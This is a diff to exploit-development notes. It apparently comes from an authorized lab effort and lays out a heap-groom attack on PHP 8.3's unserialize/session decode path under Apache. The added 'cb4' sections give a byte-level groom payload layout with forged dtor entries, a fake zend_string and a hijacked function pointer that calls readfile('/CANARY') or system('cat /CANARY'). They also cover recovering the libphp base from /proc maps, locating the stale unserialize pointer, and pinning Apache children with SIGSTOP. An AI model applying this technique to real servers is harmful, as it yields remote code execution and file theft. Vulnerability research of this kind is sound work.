@@ -82,6 +82,60 @@ Adaptation (ce chain in the groom — d chunk is fully attacker bytes):
 - zend_call_function: fn_flags=0 & object!=NULL → HAS_THIS frame,
   no RELEASE_THIS (closure bit absent) → RELRO F safe.
 
-## Next (cb4+): groom placement
-17-page class reclaim via ~8193B multipart field NAME (estrdup).
-Bias B from /proc maps; placement oracle = response signature.
+## cb4 — groom design (validated offline vs php-src-83 release paths)
+- efree_size(L,4096): zend_mm_free_heap IGNORES ptr-16 headers; it uses
+  chunk->map[page_num] of the 2MB heap chunk. For an INTERIOR page of our
+  17-page groom run, map==0 -> not SRUN -> free_large(page, 0 pages) ->
+  free_pages_ex(page,0): bitset no-op, map already 0, free_pages += 0.
+  EFFECTIVELY A NO-OP. => L = groom_chunk_start + 4096 (interior page,
+  512-aligned to pass the (dead-in-release) alignment check; entries
+  4096B fit inside the run: +4096..+8192 < 8704).
+- No double free: field-name run is freed once by its own release;
+  var_destroy's efree frees nothing. Request completes normally.
+- last=L2 (L2 = zeroed bss, e.g. B+0xf20000; .bss 0xf08e40..0xf28e10
+  RW outside RELRO): var_push writes decode entries there (bss, benign);
+  d->entries embedded @+56 never touched because last != &entries.
+- Groom payload layout (estrdup'd NAME, 8193B, reclaim class 17 pages —
+  SAME payload offset as the 8216 d chunk: payload = run_start+16 for
+  both classes):
+  +0   d.last      = L2
+  +8   d.first_dtor = L = base+4096
+  +16  d.last_dtor  = L
+  +24  allowed_classes=0, +32 ref_props=0, +40 cur_depth=0, +48 max_depth=100
+  +72  V = C region: *(V+16)=V (self), *(V+352)=F_rt   (V=C=base+72)
+       (obj=V read-only path: ce=*(V+16)=V=C; func=*(C+352)=F_rt)
+  +256 zstr: zend_string {refcount=100, gc.type_flags=IS_STRING(6),
+       h=0, len=8|11, val="/CANARY" (readfile) or "cat /CANARY" (system)}
+  +4096 L: used_slots=2, next=0,
+       data[0]={V, type_info=IS_LONG(4), u2=2}
+       data[1]={base+256, type_info=0x106 (IS_STRING|refcounted), u2=0}
+       data[2..255]=0 (decoder appends after used_slots=2)
+- var_destroy fires: entries.next(groom+64)=0 skip -> first_dtor=L
+  -> data[0] u2==2 -> param=ZVAL_COPY(data[1]) -> call
+  ce->__unserialize with obj=V -> zend_call_function(F_rt) ->
+  handler@F+72 = &zif_readfile (relocated) -> readfile("/CANARY")
+  IN-BAND during session RSHUTDOWN decode-destroy.
+- type_info 0x104 in glm3 notes replaced by plain IS_LONG(4): the
+  i_zval_ptr_dtor(zv) tail then treats data[0] as non-refcounted ->
+  no GC ops on V at all (0x100 bit would have DELREF'd V).
+- USED-SLOT COLLISION check: var_push_dtor_value would append at 2+
+  only if SID_B token stream has refcounted dup-overwrites; keep SID_B
+  stream minimal (e.g. poc|i:1;) so nothing appends.
+
+## cb4 — placement oracle (no brute force needed)
+- B (libphp bias) from /proc/<child>/maps as HOST root (children are
+  non-dumpable for in-container root; host root reads fine). Forked
+  children share the parent's mappings: B = 0xfa2f10be0000 observed
+  on PID 53 = master's B. Re-read after each apache restart.
+- basic_globals @ B+0xf1e748 (bss, 1304B). BG(unserialize).data offset:
+  NOT derivable from stripped binary; find at runtime by diffing
+  basic_globals dumps (clean child vs post-producer child): the stale
+  pointer lands in an rw anon 2MB heap region. basic_globals field
+  'unserialize' sits between 'serialize' and url_adapt state (source
+  order) -> scan window B+0xf1e748..+0xf1ec50.
+- groom base = stale BG(unserialize).data value DIRECTLY (same 17-page
+  class -> same payload offset: run_start+16 for both 8216 and 8194+16).
+- Child pinning: SIGSTOP all apache children but one via docker exec
+  (authorized lab hands) so producer+consumer land on the same child
+  unambiguously; SIGCONT after. KeepAliveTimeout=5s: keep mid-pair
+  pauses < 5s.
